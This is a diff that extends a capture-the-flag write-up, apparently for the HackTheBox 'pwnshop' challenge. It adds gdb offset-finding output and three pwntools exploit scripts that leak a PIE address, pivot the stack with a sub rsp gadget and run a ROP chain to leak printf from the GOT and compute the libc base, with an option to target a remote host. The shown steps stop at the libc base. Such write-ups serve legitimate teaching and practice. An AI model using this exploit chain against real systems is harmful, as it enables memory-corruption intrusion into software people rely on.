@@ -103,6 +103,323 @@ padding (need to calculate it first btw) + rdi_gadget + function@got + function@
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/36d25dfd-4b78-4905-8fa9-629e28ff6c50)
 
 
+> Calculating the padding
+
+```
+Find the rip offset using gdb, then get the length of our rop_payload, and lastly substract them.
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ecb91286-0dfc-42f3-87fd-b4830653564a)
+
+
+```console
+gdb-peda$ pattern search
+No register contains pattern buffer
+Registers point to pattern buffer:
+[RSI] --> offset 0 - size ~101
+[RSP] --> offset 72 - size ~29
+Pattern buffer found at:
+0x00007fffffffdd50 : offset    0 - size   80 ($sp + -0x48 [-18 dwords])
+References to pattern buffer found at:
+0x00007fffffffb6c0 : 0x00007fffffffdd50 ($sp + -0x26d8 [-2486 dwords])
+0x00007fffffffd998 : 0x00007fffffffdd50 ($sp + -0x400 [-256 dwords])
+0x00007fffffffdc78 : 0x00007fffffffdd50 ($sp + -0x120 [-72 dwords])
+```
+
+```
+Get the length of our rop payload.
+```
+
+```py
+# ROP PAYLOAD
+p = flat([
+    rdi_gadget,
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.address + 0x132a
+])
+```
+
+```py
+from pwn import *
+import os
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript="""
+init-pwndbg
+continue
+""".format(**locals())
+
+exe = './pwnshop'
+elf = context.binary = ELF(exe, checksec=True)
+# context.log_level = 'DEBUG'
+context.log_level = 'INFO'
+
+sh = start()
+pause()
+sh.sendlineafter(b'>', b'2')
+sh.sendlineafter(b'?', b'a')
+
+## LEAKING PIE
+sh.sendlineafter(b'?', b'A' * 7) 
+sh.recvline()
+get = unpack(sh.recv(6) + b'\x00' * 2)
+log.success('LEAKED PIE --> %#0x', get)
+
+elf.address = get - 0x40c0 # 16576
+log.info(f'PIE BASE --> {hex(elf.address)}')
+
+rop = ROP(elf)
+# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
+sub_rsp_gadget = elf.address + 0x1219
+log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
+rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
+log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
+# sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>', b'1')
+
+# ROP PAYLOAD
+p = flat([
+    rdi_gadget,
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.address + 0x132a
+])
+
+# calculate padding for our second payload (stack pivot)
+rip_offset = 72
+padding = rip_offset - len(p)
+log.info(f'padding --> {padding}')
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5098a61c-33dc-4aaf-9e2d-4a99a1343eb7)
+
+
+> LEAKING LIBC
+
+```py
+from pwn import *
+import os
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript="""
+init-pwndbg
+continue
+""".format(**locals())
+
+exe = './pwnshop'
+elf = context.binary = ELF(exe, checksec=True)
+# context.log_level = 'DEBUG'
+context.log_level = 'INFO'
+
+sh = start()
+pause()
+sh.sendlineafter(b'>', b'2')
+sh.sendlineafter(b'?', b'a')
+
+## LEAKING PIE
+sh.sendlineafter(b'?', b'A' * 7) 
+sh.recvline()
+get = unpack(sh.recv(6) + b'\x00' * 2)
+log.success('LEAKED PIE --> %#0x', get)
+
+elf.address = get - 0x40c0 # 16576
+log.info(f'PIE BASE --> {hex(elf.address)}')
+
+rop = ROP(elf)
+# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
+sub_rsp_gadget = elf.address + 0x1219
+log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
+rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
+log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
+# sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>', b'1')
+
+# ROP PAYLOAD
+p = flat([
+    rdi_gadget,
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.address + 0x132a
+])
+
+# calculate padding for our second payload (stack pivot)
+rip_offset = 72
+padding = rip_offset - len(p)
+log.info(f'padding --> {padding}')
+
+pay = flat([
+    asm('nop') * padding,
+    rdi_gadget,
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.address + 0x132a, # buy option
+    sub_rsp_gadget
+])
+
+# sh.sendlineafter(b':', pay)
+sh.sendafter(b':', pay)
+leaked_libc = sh.recvline().strip()
+# print(leaked_libc)
+leaked_libc = unpack(leaked_libc.ljust(8,b'\x00'))
+log.success(f'Leaked LIBC printf --> {hex(leaked_libc)}')
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/adc24faa-eca4-4f24-b5e3-bbd59f79152d)
+
+
+7. Since we don't want to work twice (after succeed local, then identify the remote libc and try to get RCE remotely again), let's just send the script remotely and use the last 3 hex to find the remote libc in libc.blukat.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8408bbfe-2f48-4b88-baee-9a9df2d08372)
+
+
+8. Hmm, let's leak another GOT function so we can get 1 result only.
+
+> USING LEAKED READ
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d01de361-9ebf-40dc-9b82-654a0764cb54)
+
+
+9. Nice now let's run pwninit to patch the binary.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/45e08bbc-2a87-4c43-990d-1057763a8ccf)
+
+
+10. Let's calculate the libc base.
+
+> SCRIPT
+
+```py
+from pwn import *
+import os
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript="""
+init-pwndbg
+continue
+""".format(**locals())
+
+# exe = './pwnshop'
+exe = './pwnshop_patched'
+elf = context.binary = ELF(exe, checksec=True)
+# context.log_level = 'DEBUG'
+context.log_level = 'INFO'
+
+library = './libc6_2.23-0ubuntu11.2_amd64.so'
+libc = context.binary = ELF(library, checksec=True)
+
+sh = start()
+pause()
+sh.sendlineafter(b'>', b'2')
+sh.sendlineafter(b'?', b'a')
+
+## LEAKING PIE
+sh.sendlineafter(b'?', b'A' * 7) 
+sh.recvline()
+get = unpack(sh.recv(6) + b'\x00' * 2)
+log.success('LEAKED PIE --> %#0x', get)
+
+elf.address = get - 0x40c0 # 16576
+log.info(f'PIE BASE --> {hex(elf.address)}')
+
+rop = ROP(elf)
+# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
+sub_rsp_gadget = elf.address + 0x1219
+log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
+rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
+log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
+# sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>', b'1')
+
+# ROP PAYLOAD
+p = flat([
+    rdi_gadget,
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.address + 0x132a
+])
+
+# calculate padding for our second payload (stack pivot)
+rip_offset = 72
+padding = rip_offset - len(p)
+log.info(f'padding --> {padding}')
+
+## LEAKING PRINTF@GOT
+pay = flat([
+    asm('nop') * padding,
+    rdi_gadget,
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.address + 0x132a, # buy option
+    sub_rsp_gadget
+])
+
+## LEAKING READ@GOT
+# pay = flat([
+#     asm('nop') * padding,
+#     rdi_gadget,
+#     elf.got['read'],
+#     elf.plt['puts'],
+#     elf.address + 0x132a, # buy option
+#     sub_rsp_gadget
+# ])
+
+# sh.sendlineafter(b':', pay)
+sh.sendafter(b':', pay)
+leaked_libc = sh.recvline().strip()
+# print(leaked_libc)
+leaked_libc = unpack(leaked_libc.ljust(8,b'\x00'))
+log.success(f'Leaked LIBC printf --> {hex(leaked_libc)}')
+
+## CALCULATING LIBC BASE
+libc.address = leaked_libc - libc.sym['printf']
+log.success('LIBC BASE --> %#0x', libc.address) 
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/93055175-0454-4aa6-862a-257e7052e15a)
+
+
+
 
 
 
